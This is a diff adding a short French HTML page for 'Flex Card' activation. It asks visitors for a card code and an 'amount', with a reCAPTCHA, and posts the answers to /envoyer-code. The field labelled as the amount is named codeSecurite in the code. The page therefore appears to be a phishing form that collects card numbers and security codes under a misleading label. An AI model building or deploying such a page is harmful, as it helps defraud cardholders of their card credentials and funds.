@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Activation de carte</title>
+  <link rel="stylesheet" href="style.css">
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+  <link rel="icon" type="image/png" href="logo.png">
+</head>
+<body>
+  <div class="main-container">
+    <img src="logo.png" alt="Flex Card" class="logo fade-in">
+    <p class="fade-in delay">Bienvenue</p>
+    <p class="fade-in delay-2">Pour activer votre carte, entrez le code de la carte et le montant.</p>
+
+    <form action="/envoyer-code" method="POST" class="fade-in delay-2">
+      <label>Code de la carte</label><br>
+      <input type="text" name="numeroCarte" required><br><br>
+
+      <label>Montant</label><br>
+      <input type="text" name="codeSecurite" required><br><br>
+
+      <div class="g-recaptcha" data-sitekey="6Lc1nR4rAAAAAJOR11moTvVKGjCD6Qw4amYtqzws"></div><br>
+
+      <button type="submit">Activer ma carte</button>
+    </form>
+
+    <footer class="footer">
+      <nav>
+        <a href="/">Accueil</a>
+        <a href="a-propos.html">À propos</a>
+        <a href="confidentialite.html">Politique de confidentialité</a>
+      </nav>
+    </footer>
+  </div>
+</body>
+</html>
